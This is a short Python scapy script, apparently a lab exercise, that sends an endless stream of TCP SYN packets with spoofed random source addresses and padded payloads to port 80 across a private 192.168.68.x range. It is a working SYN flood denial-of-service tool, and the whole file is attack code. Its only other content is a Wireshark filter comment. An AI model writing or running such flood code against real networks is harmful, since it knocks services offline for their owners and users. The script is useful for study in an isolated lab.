from scapy.all import *
from scapy.layers.inet import TCP, IP

target_ip = "192.168.68.1/24"
target_port = 80

ip = IP(src=RandIP(target_ip), dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(b"x" * 1024)

p = ip / tcp / raw

send(p, loop=1, verbose=0)

#Make sure to use tcp.port == 80 in Wireshark